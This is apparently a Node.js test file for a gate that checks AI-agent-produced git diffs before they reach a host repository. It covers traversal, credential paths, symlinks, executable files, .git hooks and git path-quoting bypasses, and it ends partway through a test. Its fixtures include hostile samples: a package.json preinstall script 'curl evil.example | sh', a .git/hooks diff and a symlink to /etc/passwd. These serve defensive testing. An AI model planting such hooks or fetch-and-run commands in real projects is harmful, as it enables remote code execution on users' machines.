// INV-2 gate test: code returns to Mac only through explicit reviewed gate
// Tests: agent output reaches host files ONLY via the reviewed apply, and
// the gate's own validation — not just git's — rejects unsafe diffs.

import { deepStrictEqual, ok, strictEqual } from "node:assert";
import { execSync } from "node:child_process";
import {
	existsSync,
	mkdirSync,
	mkdtempSync,
	readFileSync,
	rmSync,
	writeFileSync,
} from "node:fs";
import { tmpdir } from "node:os";
import { join } from "node:path";
import { afterEach, beforeEach, describe, it } from "node:test";
import {
	APPLY_CHECK_MAX_BUFFER,
	dequoteGitPath,
	integrationGate,
	validateDiff,
} from "../src/switchyard/integrate/index.mjs";

let projectPath;

function initRepo() {
	const dir = mkdtempSync(join(tmpdir(), "switchyard-gate-"));
	execSync("git init -q", { cwd: dir, stdio: "pipe" });
	execSync('git config user.email "test@test.com"', {
		cwd: dir,
		stdio: "pipe",
	});
	execSync('git config user.name "Test"', { cwd: dir, stdio: "pipe" });
	return dir;
}

function commitFile(dir, relativePath, content) {
	const fullPath = join(dir, relativePath);
	mkdirSync(join(fullPath, ".."), { recursive: true });
	writeFileSync(fullPath, content, "utf8");
	execSync(`git add ${relativePath}`, { cwd: dir, stdio: "pipe" });
	execSync('git commit -q -m "base"', { cwd: dir, stdio: "pipe" });
}

// Build a diff by making a change against a real git working tree and
// capturing git's own diff output — every fixture below is a diff git
// itself produced, not hand-written unified-diff text, so the parsing
// assumptions match real dispatches.
function buildDiff(dir, mutate) {
	mutate(dir);
	return execSync("git diff --no-color", { cwd: dir, encoding: "utf8" });
}

function buildStagedDiff(dir, mutate) {
	mutate(dir);
	execSync("git add -A", { cwd: dir, stdio: "pipe" });
	return execSync("git diff --cached --no-color", {
		cwd: dir,
		encoding: "utf8",
	});
}

beforeEach(() => {
	projectPath = initRepo();
	commitFile(projectPath, "test.txt", "original content\n");
});

afterEach(() => {
	rmSync(projectPath, { recursive: true, force: true });
});

describe("integration gate", () => {
	it("applies a diff through the reviewed gate (not a manual git apply)", () => {
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, true);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"modified content\n",
		);
	});

	it("applies a diff whose trailing newline was stripped (captureDiff .trim() regression)", () => {
		// Regression: every adapter's captureDiff() returns `diff.trim()`, which
		// strips the trailing newline `git apply` requires — so the real
		// captureDiff -> integrationGate seam (never exercised together before)
		// failed with "corrupt patch" and NO edit ever reached the host. The
		// gate must re-terminate such a patch and still apply it. The unit
		// fixtures elsewhere use git-produced diffs that keep their newline,
		// which is exactly why this hole hid.
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const trimmed = diff.trim();
		ok(
			!trimmed.endsWith("\n"),
			"fixture must reproduce captureDiff's stripped-newline shape",
		);

		const result = integrationGate(trimmed, projectPath);
		strictEqual(result.success, true, result.message);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"modified content\n",
		);
	});

	for (const trailingNewlines of [1, 2]) {
		it(`preserves ${trailingNewlines} valid trailing newline(s) when normalizing`, () => {
			const diff = buildDiff(projectPath, (dir) => {
				writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
			});
			execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });
			const body = diff.replace(/\n+$/u, "");
			const patch = `${body}${"\n".repeat(trailingNewlines)}`;

			const result = integrationGate(patch, projectPath);
			strictEqual(result.success, true, result.message);
			strictEqual(
				readFileSync(join(projectPath, "test.txt"), "utf8"),
				"modified content\n",
			);
		});
	}

	it("applies a diff that CREATES a new file, landing it on the host (captureDiff new-file regression)", () => {
		// captureDiff now stages (`git add -A`) before diffing so newly created
		// files are captured — the most common agent output. A new-file diff must
		// pass the gate and actually create the file on the host, trimmed newline
		// and all (this is the buildStagedDiff shape a real dispatch produces).
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, "src"), { recursive: true });
			writeFileSync(
				join(dir, "src", "new-module.txt"),
				"created by agent\n",
				"utf8",
			);
		});
		ok(diff.includes("new file"), "fixture must be a new-file diff");
		// Undo the fixture's local creation so the gate is what lands it on host.
		rmSync(join(projectPath, "src"), { recursive: true, force: true });
		execSync("git reset -q", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff.trim(), projectPath);
		strictEqual(result.success, true, result.message);
		strictEqual(
			readFileSync(join(projectPath, "src", "new-module.txt"), "utf8"),
			"created by agent\n",
		);
	});

	it("rejects a diff that escapes the project root, even if git's own check ever changed", () => {
		const traversalDiff = `diff --git a/../../../etc/switchyard-poc b/../../../etc/switchyard-poc
new file mode 100644
index 0000000..abcdef1
--- /dev/null
+++ b/../../../etc/switchyard-poc
@@ -0,0 +1 @@
+pwned
`;
		const result = integrationGate(traversalDiff, projectPath);
		strictEqual(result.success, false);

		// Real guard (replaces a vacuous readFileSync("/etc/hosts").slice(0,0)
		// assertion that could never fail): the rejected diff must not have
		// mutated the temporary repo the gate ran against. A regression that
		// applied before rejecting, or partially applied, leaves a dirty tree
		// or a changed file behind. (git apply itself also rejects this path
		// with status 128, so the external target is never written either.)
		const status = execSync("git status --porcelain", {
			cwd: projectPath,
			encoding: "utf8",
		});
		strictEqual(
			status,
			"",
			"a rejected traversal diff must not touch the temp repo working tree",
		);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"original content\n",
		);
	});

	it("rejects a diff touching a credential-convention path", () => {
		const diff = buildStagedDiff(projectPath, (dir) => {
			writeFileSync(join(dir, ".env"), "SECRET=xyz\n", "utf8");
		});
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
	});

	it("pins the bounded apply-check buffer (regression: the --check probes must stay memory-bounded)", () => {
		// The forward/reverse `git apply --check` probes (applyCheckPasses)
		// pipe the diff to git and capture its output; maxBuffer bounds that
		// capture so a pathological patch cannot buffer unbounded stderr.
		// The module has no injectable spawn seam, and `git apply --check`
		// output does not scale with patch size (verified empirically: errors
		// are emitted once per failing file, so the bound cannot be driven
		// past from a real diff), so this is a narrow source contract: the
		// exported bound must be an explicit, generous-but-finite value AND
		// the probe's spawnSync must actually pass it. Either half dropped
		// (falling back to the default 1 MiB bound, removing maxBuffer, or
		// shrinking the constant) fails this test.
		strictEqual(APPLY_CHECK_MAX_BUFFER, 8 * 1024 * 1024);
		ok(
			APPLY_CHECK_MAX_BUFFER > 1024 * 1024,
			"bound must be larger than the default 1 MiB the probe would otherwise fall back to",
		);
		const source = readFileSync(
			new URL("../src/switchyard/integrate/index.mjs", import.meta.url),
			"utf8",
		);
		// Anchor the wiring to the probe implementation itself rather than
		// to an unanchored module-wide count: a refactor could move the
		// single maxBuffer site to a different spawnSync (e.g. the mutating
		// apply) and leave the --check probes unbounded while the old count
		// still matched. Extract applyCheckPasses' own body via a
		// balanced-brace scan (pure string ops — deterministic, no runtime
		// import needed)...
		const fnMatch = /function\s+applyCheckPasses\s*\([\s\S]*?\)\s*\{/.exec(
			source,
		);
		ok(fnMatch, "applyCheckPasses must be a function declaration");
		const bodyStart = fnMatch.index + fnMatch[0].length;
		let depth = 1;
		let cursor = bodyStart;
		while (cursor < source.length && depth > 0) {
			if (source[cursor] === "{") depth += 1;
			else if (source[cursor] === "}") depth -= 1;
			cursor += 1;
		}
		ok(
			depth === 0 && cursor <= source.length,
			"applyCheckPasses body must terminate at its closing brace",
		);
		const probeBody = source.slice(bodyStart, cursor - 1);
		// ...and require the wiring inside that body:
		const probeWiring =
			probeBody.match(/maxBuffer:\s*APPLY_CHECK_MAX_BUFFER/g) ?? [];
		strictEqual(
			probeWiring.length,
			1,
			"applyCheckPasses must set maxBuffer: APPLY_CHECK_MAX_BUFFER exactly once in its own body",
		);
		// No spawnSync outside applyCheckPasses may use the bound either:
		// every occurrence in the module must be inside the probe body.
		const moduleWiring =
			source.match(/maxBuffer:\s*APPLY_CHECK_MAX_BUFFER/g) ?? [];
		strictEqual(
			moduleWiring.length,
			probeWiring.length,
			"no spawnSync outside applyCheckPasses may use the bound",
		);
	});

	it("tags a credential-convention rejection with credentialFlagged: true, both from validateDiff and integrationGate (Task D.4: the signal runner uses to withhold the diff body from disk)", () => {
		const diff = buildStagedDiff(projectPath, (dir) => {
			writeFileSync(join(dir, ".env"), "SECRET=xyz\n", "utf8");
		});

		const validation = validateDiff(diff, projectPath);
		strictEqual(validation.safe, false);
		strictEqual(validation.credentialFlagged, true);

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.credentialFlagged, true);
	});

	it("does not set credentialFlagged on unrelated rejections", () => {
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("ln -s /etc/passwd evil-link", { cwd: dir });
		});
		execSync("git rm --cached -q evil-link", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(!result.credentialFlagged);
	});

	it("does NOT reject a legitimate diff merely because it contains the word 'password' in content", () => {
		// Regression: the prior content-substring blocklist rejected any diff
		// whose text contained "password"/"token"/"secret" anywhere — including
		// a harmless comment or an unrelated identifier — while doing nothing
		// to stop an attacker who simply avoids those words.
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "test.txt"),
				"// validate the password field length\noriginal content\n",
				"utf8",
			);
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, true, result.message);
	});

	it("rejects a diff that creates a symlink pointing outside the project", () => {
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("ln -s /etc/passwd evil-link", { cwd: dir });
		});
		// Un-stage/untrack the symlink created purely to produce the diff above —
		// the gate must reject *applying* it; this isn't about the fixture's
		// own working-tree state.
		execSync("git rm --cached -q evil-link", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("symlink"));
	});

	it("rejects a diff that introduces a new executable file", () => {
		// The concrete escape hatch a content blocklist can't close: an
		// executable script doesn't need to mention "password" or "token" to
		// run arbitrary commands the next time anything executes it.
		const diff = buildStagedDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "evil.sh"), "#!/bin/sh\necho pwned\n", "utf8");
			execSync("chmod +x evil.sh", { cwd: dir });
		});
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("executable"));
	});

	it("requires explicit review for a diff touching package.json instead of auto-applying", () => {
		commitFile(projectPath, "package.json", '{"name":"x","scripts":{}}\n');
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "package.json"),
				'{"name":"x","scripts":{"preinstall":"curl evil.example | sh"}}\n',
				"utf8",
			);
		});
		execSync("git checkout -- package.json", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.requiresReview, true);
		ok(result.sensitivePaths.includes("package.json"));

		// The content never reached the host file — this is the concrete
		// exploit the prior gate missed: this diff passed its content
		// blocklist cleanly (no "password"/"token"/etc. anywhere in it).
		const onDisk = readFileSync(join(projectPath, "package.json"), "utf8");
		ok(!onDisk.includes("curl evil.example"));
	});

	it("rejects a package.json diff when AllowManifests is set without a Files declaration", () => {
		commitFile(projectPath, "package.json", '{"name":"x"}\n');
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "package.json"), '{"name":"y"}\n', "utf8");
		});
		execSync("git checkout -- package.json", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath, {
			allowSensitiveManifests: true,
		});
		strictEqual(result.success, false);
		strictEqual(result.requiresReview, true);
	});

	it("rejects a malformed/truncated diff without partially applying it", () => {
		const truncated = `diff --git a/test.txt b/test.txt
index 1234567..abcdefg 100644
--- a/test.txt
+++ b/test.txt
@@ -1 +5000 @@
-nonexistent line that will never match
`;
		const result = integrationGate(truncated, projectPath);
		strictEqual(result.success, false);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"original content\n",
		);
	});

	it("validateDiff exposes safe:false with a reason for direct callers", () => {
		const result = validateDiff("not a diff at all", projectPath);
		strictEqual(result.safe, false);
		ok(typeof result.reason === "string" && result.reason.length > 0);
	});

	it("rejects an empty or whitespace-only diff instead of erroring obscurely", () => {
		for (const empty of ["", "   \n\t \n"]) {
			const result = integrationGate(empty, projectPath);
			strictEqual(result.success, false);
			ok(result.message.toLowerCase().includes("empty"));
		}
	});

	it("rejects a diff that writes into .git internals (e.g. a hook), even though git apply itself accepts it", () => {
		// Regression-shaped gap: `git apply --numstat`/the real `git apply`
		// happily parse and would happily write a path under .git/ (verified
		// directly against the installed git) — nothing about git's own
		// plumbing refuses it. A hook written this way (e.g. .git/hooks/
		// post-checkout) executes automatically on a later git operation,
		// making this an RCE path structurally distinct from — and not
		// caught by — the path-traversal, symlink, or executable-file checks
		// above, since .git/hooks/post-checkout lives inside the project
		// root and isn't itself a symlink.
		const diff = `diff --git a/.git/hooks/post-checkout b/.git/hooks/post-checkout
new file mode 100755
index 0000000..abcdef1
--- /dev/null
+++ b/.git/hooks/post-checkout
@@ -0,0 +1,2 @@
+#!/bin/sh
+echo pwned
`;
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes(".git"));
	});

	it("rejects a diff that renames a file into a credential-convention path", () => {
		// A rename lands only the *new* path in `git apply --numstat` output
		// (verified: a clean rename reports just the destination, not
		// "old => new"), so the sensitive-path check must be applied against
		// that reported path — not skipped just because the change is a
		// rename rather than a new-file creation.
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("git mv test.txt .env", { cwd: dir });
		});
		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
	});

	it("detects a no-op diff (hunks net to zero content change) even with unrelated dirty state", () => {
		// Regression: integrationGate reported {success: true} whenever
		// `git apply` exited 0, even when the diff netted to zero real
		// content change — a production incident. The new no-op check
		// compares pre- and post-apply git status scoped to touched paths
		// only, so unrelated dirty state in other files is ignored.
		commitFile(projectPath, "target.txt", "a\nb\nc\n");
		commitFile(projectPath, "other.txt", "original\n");

		// A structurally-valid diff whose hunk changes 'b' to 'b' — a
		// semantic no-op. `git apply --numstat` parses it (passes
		// structural validation), `git apply` exits 0 (context matches),
		// but the file content doesn't change.
		const noopDiff = `${[
			"diff --git a/target.txt b/target.txt",
			"--- a/target.txt",
			"+++ b/target.txt",
			"@@ -1,3 +1,3 @@",
			" a",
			"-b",
			"+b",
			" c",
		].join("\n")}\n`;

		// Unrelated dirty state in a file the diff doesn't touch
		writeFileSync(join(projectPath, "other.txt"), "modified\n", "utf8");

		const result = integrationGate(noopDiff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.message, "no_op_diff");

		// Verify the genuine empty-diff path is unchanged
		const emptyResult = integrationGate("", projectPath);
		strictEqual(emptyResult.success, false);
		ok(emptyResult.message.toLowerCase().includes("empty"));
	});

	it("applies an identical diff twice: the second call is a success no-op with alreadyApplied", () => {
		// Idempotent dispatch: a task whose diff was already applied must not
		// be reported as a failure (or re-mutate the host). The forward
		// `git apply --check` fails because the before-state no longer
		// matches; the reverse check succeeds because the change is already
		// present, so the gate returns a successful alreadyApplied no-op.
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const first = integrationGate(diff, projectPath);
		strictEqual(first.success, true, first.message);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"modified content\n",
		);

		const second = integrationGate(diff, projectPath);
		strictEqual(second.success, true, second.message);
		strictEqual(second.alreadyApplied, true);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"modified content\n",
			"re-applying must not mutate the host",
		);
	});

	it("second application of a NEW-FILE diff is an alreadyApplied no-op (reverse-check semantics)", () => {
		// New-file shape: a reverse apply of a new-file diff deletes the
		// already-created file, so `--reverse --check` succeeds and the gate
		// reports alreadyApplied without touching the host.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, "src"), { recursive: true });
			writeFileSync(
				join(dir, "src", "new-module.txt"),
				"created by agent\n",
				"utf8",
			);
		});
		ok(diff.includes("new file"), "fixture must be a new-file diff");
		rmSync(join(projectPath, "src"), { recursive: true, force: true });
		execSync("git reset -q", { cwd: projectPath, stdio: "pipe" });

		const first = integrationGate(diff.trim(), projectPath);
		strictEqual(first.success, true, first.message);
		ok(existsSync(join(projectPath, "src", "new-module.txt")));

		const second = integrationGate(diff.trim(), projectPath);
		strictEqual(second.success, true, second.message);
		strictEqual(second.alreadyApplied, true);
		strictEqual(
			readFileSync(join(projectPath, "src", "new-module.txt"), "utf8"),
			"created by agent\n",
		);
	});

	it("second application of a RENAME diff is an alreadyApplied no-op (reverse-check semantics)", () => {
		commitFile(projectPath, "src/old.mjs", "original\n");
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("git mv src/old.mjs src/new.mjs", { cwd: dir });
		});
		execSync("git reset -q HEAD -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});
		execSync("git checkout -q -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});
		rmSync(join(projectPath, "src", "new.mjs"), { force: true });

		const first = integrationGate(diff, projectPath);
		strictEqual(first.success, true, first.message);
		ok(existsSync(join(projectPath, "src", "new.mjs")));
		ok(!existsSync(join(projectPath, "src", "old.mjs")));

		const second = integrationGate(diff, projectPath);
		strictEqual(second.success, true, second.message);
		strictEqual(second.alreadyApplied, true);
		ok(existsSync(join(projectPath, "src", "new.mjs")));
		ok(!existsSync(join(projectPath, "src", "old.mjs")));
	});

	it("second application of a DELETE diff is an alreadyApplied no-op (reverse-check semantics)", () => {
		commitFile(projectPath, "src/gone.mjs", "original\n");
		const diff = buildStagedDiff(projectPath, (dir) => {
			execSync("git rm -q src/gone.mjs", { cwd: dir });
		});
		execSync("git reset -q HEAD -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});
		execSync("git checkout -q -- src/", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const first = integrationGate(diff, projectPath);
		strictEqual(first.success, true, first.message);
		ok(!existsSync(join(projectPath, "src", "gone.mjs")));

		const second = integrationGate(diff, projectPath);
		strictEqual(second.success, true, second.message);
		strictEqual(second.alreadyApplied, true);
		ok(!existsSync(join(projectPath, "src", "gone.mjs")));
	});

	it("still fails on a genuinely conflicting diff (forward and reverse checks both fail)", () => {
		// A third-party edit moves the tree to a state matching neither the
		// diff's before-state (forward `--check` fails) nor its after-state
		// (reverse `--check` fails) — a real conflict, not an already-applied
		// no-op. It must remain a failure and leave the host untouched.
		commitFile(projectPath, "conflict.txt", "line a\nline b\nline c\n");
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "conflict.txt"),
				"line a\nline x\nline c\n",
				"utf8",
			);
		});
		execSync("git checkout -- conflict.txt", {
			cwd: projectPath,
			stdio: "pipe",
		});
		writeFileSync(
			join(projectPath, "conflict.txt"),
			"line a\nline y\nline c\n",
			"utf8",
		);

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.message, "Diff apply failed");
		// Task 2.1: a genuine conflict must carry git's actionable stderr
		// under `reason` (e.g. "error: conflict.txt: patch does not apply")
		// so the caller can distinguish a real conflict from a mis-delivered
		// patch, while keeping the generic message above.
		ok(
			typeof result.reason === "string" && result.reason.length > 0,
			"a genuine conflict must include git's actionable stderr as reason",
		);
		ok(
			/patch does not apply|patch failed|error:/i.test(result.reason),
			`reason should quote git's own failure text, got: ${JSON.stringify(result.reason)}`,
		);
		strictEqual(
			readFileSync(join(projectPath, "conflict.txt"), "utf8"),
			"line a\nline y\nline c\n",
			"the conflicting diff must not modify the host file",
		);
		strictEqual(
			result.reasonKind,
			"conflict",
			"a real conflict must be tagged 'conflict', not 'corrupt_patch'",
		);
	});

	it("tags a truncated/malformed diff as reasonKind 'corrupt_patch', distinct from a genuine conflict", () => {
		// Regression for a live incident (2026-08-03): a container-generated
		// diff arrived with its final hunk cut short — the hunk header claimed
		// more lines than were actually present, and the file had no trailing
		// newline. git's `--check` (forward and reverse) both report
		// "corrupt patch" for this, distinct from "patch does not apply" for a
		// real conflict — the two must not be reported identically, since a
		// truncated diff calls for a retry/re-generation while a real conflict
		// calls for a different diff entirely.
		const fullDiff = buildDiff(projectPath, (dir) => {
			writeFileSync(
				join(dir, "test.txt"),
				"original content\nline two\nline three\nline four\nline five\nline six\nline seven\nline eight\nline nine\nCHANGED\n",
				"utf8",
			);
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		// Drop the final 2 lines of the diff, matching the real incident's
		// artifact exactly: the last hunk's trailing context/added lines are
		// missing and the file has no trailing newline.
		const lines = fullDiff.split("\n");
		const truncatedDiff = lines.slice(0, lines.length - 3).join("\n");

		const result = integrationGate(truncatedDiff, projectPath);
		strictEqual(result.success, false);
		// A truncated diff fails to parse at all (git apply --numstat, called
		// from validateDiff) — earlier than a genuine conflict, which parses
		// fine and only fails later at the actual --check/apply stage. Both
		// paths must still carry reasonKind so a caller can tell them apart
		// without inspecting message text.
		strictEqual(result.message, "diff could not be parsed by git apply");
		strictEqual(result.reasonKind, "corrupt_patch");
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"original content\n",
			"a truncated diff must not modify the host file",
		);
	});

	it("reports alreadyApplied even when requiredPaths (Files: enforcement) is set — the actual runner call shape", () => {
		// runner/index.mjs always calls integrationGate with
		// `{requiredPaths: task.requiredPaths}` (the task's declared `Files:`
		// field), never bare — so the realistic idempotent-retry path (a killed
		// dispatch's checkpoint retry regenerating the same diff, INV-6/Task
		// 1.4's whole motivation) always goes through the requiredPaths branch,
		// not the bare-call shape the other alreadyApplied tests use. The
		// requiredPaths checks parse the diff text itself (extractTouchedPaths/
		// extractSummaryLines), independent of tree state, so they must not be
		// disturbed by a second, already-applied call.
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const first = integrationGate(diff, projectPath, {
			requiredPaths: ["test.txt"],
		});
		strictEqual(first.success, true, first.message);

		const second = integrationGate(diff, projectPath, {
			requiredPaths: ["test.txt"],
		});
		strictEqual(second.success, true, second.message);
		strictEqual(second.alreadyApplied, true);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"modified content\n",
			"re-applying under requiredPaths enforcement must not mutate the host",
		);
	});

	it("a multi-file diff with one already-applied file and one genuinely conflicting file fails closed, not a false alreadyApplied (mixed-state regression)", () => {
		// Task 1.4 explicitly does not attempt to distinguish a "mixed"
		// (partially-already-applied, partially-conflicting) patch from a
		// plain conflict, because a whole-patch forward/reverse check cannot
		// observe that distinction. This proves the conservative direction
		// actually holds in code: when one file in a multi-file diff already
		// matches the diff's after-state but another file has been
		// independently changed to a THIRD state (matching neither the diff's
		// before- nor after-state), the whole patch must fail — it must never
		// be silently swallowed as alreadyApplied, which would abandon the
		// conflicting file's real conflict undetected.
		commitFile(projectPath, "a.txt", "original A\n");
		commitFile(projectPath, "b.txt", "line a\nline b\nline c\n");
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "a.txt"), "modified A\n", "utf8");
			writeFileSync(join(dir, "b.txt"), "line a\nline x\nline c\n", "utf8");
		});
		execSync("git checkout -- a.txt b.txt", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const first = integrationGate(diff, projectPath);
		strictEqual(first.success, true, first.message);
		strictEqual(
			readFileSync(join(projectPath, "a.txt"), "utf8"),
			"modified A\n",
		);
		strictEqual(
			readFileSync(join(projectPath, "b.txt"), "utf8"),
			"line a\nline x\nline c\n",
		);

		// a.txt is left at the diff's after-state (as if already applied), but
		// b.txt is independently changed to a third state that matches
		// neither the diff's before-state nor its after-state.
		writeFileSync(
			join(projectPath, "b.txt"),
			"line a\nline z\nline c\n",
			"utf8",
		);

		const second = integrationGate(diff, projectPath);
		strictEqual(second.success, false, second.message);
		ok(
			!second.alreadyApplied,
			"a mixed already-applied/conflicting patch must not report alreadyApplied",
		);
		strictEqual(
			readFileSync(join(projectPath, "a.txt"), "utf8"),
			"modified A\n",
			"the failed apply must not touch a.txt either (git apply is all-or-nothing)",
		);
		strictEqual(
			readFileSync(join(projectPath, "b.txt"), "utf8"),
			"line a\nline z\nline c\n",
			"the failed apply must leave b.txt's conflicting content untouched",
		);
	});

	it("rejects a credential-convention path even when its directory name is non-ASCII (git C-quoting bypass)", () => {
		// INV-2 bypass: with git's default `core.quotePath`, `git apply
		// --numstat` C-quotes any path containing a non-ASCII byte, so
		// `café/.env` arrives as the literal string `"caf\303\251/.env"` —
		// quotes and octal escapes included. Its trailing `"` defeats the
		// `(\.|$)` anchor in SENSITIVE_PATH_PATTERNS, so the unfixed gate
		// judged this diff safe and WROTE the secret to disk.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, "café"), { recursive: true });
			writeFileSync(join(dir, "café", ".env"), "SECRET=abc123\n", "utf8");
		});
		// Remove the fixture file the diff was captured from, so the gate
		// rejecting the apply is what keeps the secret off the host — not a
		// leftover working-tree artifact.
		rmSync(join(projectPath, "café"), { recursive: true, force: true });
		execSync("git rm -r --cached -q café", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
		ok(
			!existsSync(join(projectPath, "café", ".env")),
			"the sensitive file must not have been written to the host",
		);
	});

	it("rejects a credential-convention path whose name needs unconditional git quoting (double-quote in path)", () => {
		// A double-quote in a path is C-quoted by git even with
		// `core.quotePath=false`, so `-c core.quotePath=false` alone is not
		// enough — dequoteGitPath must decode `"we\"ird/.env"` back to the
		// real path for SENSITIVE_PATH_PATTERNS to match.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, 'we"ird'), { recursive: true });
			writeFileSync(join(dir, 'we"ird', ".env"), "SECRET=abc123\n", "utf8");
		});
		rmSync(join(projectPath, 'we"ird'), { recursive: true, force: true });
		execSync('git rm -r --cached -q "we\\"ird"', {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		ok(result.message.includes("credential"));
		ok(
			!existsSync(join(projectPath, 'we"ird', ".env")),
			"the sensitive file must not have been written to the host",
		);
	});

	it("requires review for a manifest file whose directory name is non-ASCII (git C-quoting bypass)", () => {
		// Same C-quoting bypass against MANIFEST_REVIEW_PATTERNS: an unfixed
		// gate auto-applied `naïve/package.json` with a malicious preinstall
		// script because the quoted path never matched `package\.json$`.
		const diff = buildStagedDiff(projectPath, (dir) => {
			mkdirSync(join(dir, "naïve"), { recursive: true });
			writeFileSync(
				join(dir, "naïve", "package.json"),
				'{"name":"x","scripts":{"preinstall":"curl evil.example | sh"}}\n',
				"utf8",
			);
		});

		const validation = validateDiff(diff, projectPath);
		strictEqual(validation.safe, true);
		strictEqual(validation.requiresReview, true);
		ok(validation.sensitivePaths.includes("naïve/package.json"));

		const result = integrationGate(diff, projectPath);
		strictEqual(result.success, false);
		strictEqual(result.requiresReview, true);
		ok(result.sensitivePaths.includes("naïve/package.json"));
	});
});

describe("Files allowlist enforcement", () => {
	it("exact declared set passes gate", () => {
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "test.txt"), "modified content\n", "utf8");
		});
		execSync("git checkout -- test.txt", { cwd: projectPath, stdio: "pipe" });

		const result = integrationGate(diff, projectPath, {
			requiredPaths: ["test.txt"],
		});
		strictEqual(result.success, true);
		strictEqual(
			readFileSync(join(projectPath, "test.txt"), "utf8"),
			"modified content\n",
		);
	});

	it("returns required_paths_missing when a declared path is not touched", () => {
		commitFile(projectPath, "src/a.mjs", "original\n");
		commitFile(projectPath, "src/b.mjs", "original\n");
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "src", "a.mjs"), "modified\n", "utf8");
		});
		execSync("git checkout -- src/a.mjs", {
			cwd: projectPath,
			stdio: "pipe",
		});

		const result = integrationGate(diff, projectPath, {
			requiredPaths: ["src/a.mjs", "src/b.mjs"],
		});
		strictEqual(result.success, false);
		strictEqual(result.message, "required_paths_missing");
		deepStrictEqual(result.missingPaths, ["src/b.mjs"]);
	});

	it("returns undeclared_paths_touched when a touched path is not declared", () => {
		commitFile(projectPath, "src/a.mjs", "original\n");
		commitFile(projectPath, "src/b.mjs", "original\n");
		const diff = buildDiff(projectPath, (dir) => {
			writeFileSync(join(dir, "src", "a.mjs"), "modified\n", "utf8");
			writeFileSync(join(dir, "src", "b.mjs"), "also modified\n", "utf8");
		});

		const result = integrationGate(diff, projectPath, {
			requiredPaths: ["src/a.mjs"],
		});
		strictEqual(result.success, false);
		strictEqual(result.message, "undeclared_paths_touched");
		ok(result.extraPaths.includes("src/b.mjs"));
	});

	it("returns empty_required_diff when diff is empty and requiredPaths is set", () => {
		const result = integrationGate("", projectPath, {
			requiredPaths: ["test.txt"],
		});
		strictEqual(result.success, false);
		strictEqual(result.message, "empty_required_diff");
	});

	it("rename: Files declaring the destination passes (both rename paths counted for declaration)", () => {
		commitFile(projectPath, "src/old.mjs", "original\n");
